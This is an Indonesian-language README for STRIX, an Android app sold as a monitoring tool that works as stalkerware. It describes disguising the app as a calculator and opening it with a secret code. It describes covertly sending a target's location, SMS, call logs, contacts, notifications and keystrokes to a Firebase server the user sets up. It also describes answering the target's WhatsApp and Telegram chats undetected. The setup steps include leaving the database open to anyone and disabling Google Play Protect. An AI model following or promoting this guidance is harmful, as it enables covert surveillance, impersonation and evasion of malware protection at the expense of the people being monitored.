# STRIX 🦉

STRIX adalah aplikasi Monitoring tool untuk Android

## Fitur ✨

*   **Pilih Role:** **Host** (Pemantau) atau **Client** (Target yang dipantau).
*   **Mode Penyamaran (Stealth):** icon aplikasinya jadi **Kalkulator:**
*   **Cara Buka Sandi Rahasia:** ketik `8888='
*   **Phantom Reply:** Sebagai Host, bisa langsung balas chat WhatsApp/Telegram yang masuk ke HP target dari jauh tanpa ketahuan!
*   **Data Real-time:** Aplikasi ini otomatis mengirim rute Lokasi, SMS, Log Telpon, Kontak, Daftar Aplikasi, Info WiFi, *rekaman ketikan keyboard (Keylogger)*, dan semua Notifikasi target

## Cara Setting Private Server (Firebase) ⚙️

### 1. Buat Project Baru di Firebase
1. Buka [Firebase Console](https://console.firebase.google.com/).
2. Klik **Add project** , beri nama, dan lanjutkan sampai selesai.

### 2. Copy Kredensial (WEB API Key, App ID, Project ID)
1. Di halaman utama Firebase Console (dalam project yang baru dibuat), klik logo **Add app** lalu pilih platform **Android**.
2. Masukkan **Android Package Name** `com.strix.safesync` lalu pilih Register app , pengaturan yang lainnya biarkan default saja.
3. Setelah aplikasi Android terdaftar klik nama aplikasi yang baru di daftarkan tadi dan pilih ikon gear (⚙️).
4. Di tab *General* akan ada:
   - **App ID**
   - **Project ID**
   - **Web API Key**
   NOTE : jika web api key tidak muncul , pilih **Add app** di bagian **your app** pilih icon WEB **</>** dan isi Nickname/nama bebas kemudian **Register app** setelah itu akan muncul web api key dengan nama apiKey setelah itu pilih **continue to console**.

### 3. Aktifkan Layanan Firebase
Sebelum mulai dipakai, **Wajib** mengaktifkan layanan berikut di panel sebelah kiri Firebase Console:
1. **Authentication**:
   - Buka menu *Security* > *Authentication* > *Get Started*.
   - Ubah tab ke *Sign-in method*, lalu aktifkan **Anonymous**.
2. **Firestore Database**:
   - Buka menu *Databases & Storage* > *Firestore Database* > *Create database*.
   - Pilih region bebas(disarankan pilih lokasi terdekat), mulai dalam Mode production lalu ke tab **Rules** -> *Edit Rules* agar `allow read, write: if true;`.

### 4. Input di Aplikasi STRIX
1. Buka aplikasi.
2. Masukkan ke-3 data tersebut yang sudah di copy dari firebase console:
   - **Web API Key**: `AIzaSy...`
   - **App ID**: `1:xxxx:android:yyyy`
   - **Project ID**: `nama-project`
3. Tekan **Simpan**. Selesai! Aplikasi akan terhubung otomatis ke server pribadi.

## Google Play Protect! ⚠️

**Penting:** Karena STRIX ini berjalan di latar belakang dan izin akses berat (Keylogger dan Lokasi), **Google Play Protect dan beberapa aplikasi m-banking mendeteksi aplikasi ini sebagai Spyware/Malware.**

*   Cara install, **WAJIB** ke Play Store -> klik Profil -> **Play Protect** -> klik ikon gir (⚙️) -> **Matikann fitur "Scan apps with Play Protect"**. **WAJIB Aktifkan Special apps/access notification & accessibility untuk aplikasi ini di pengaturan hp TARGET/CLIENT**
*   Project ini **HANYA Untuk Edukasi** atau pantau HP anak/family , Jika dipakai untuk hal menyimpang (menyadap pacar, dsb) tanpa ada kesepakatan, resiko ditanggung sendiri! **DEVELOPER TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN APLIKASI INI!**

## Lisensi
MIT License bebas pakai 🍻
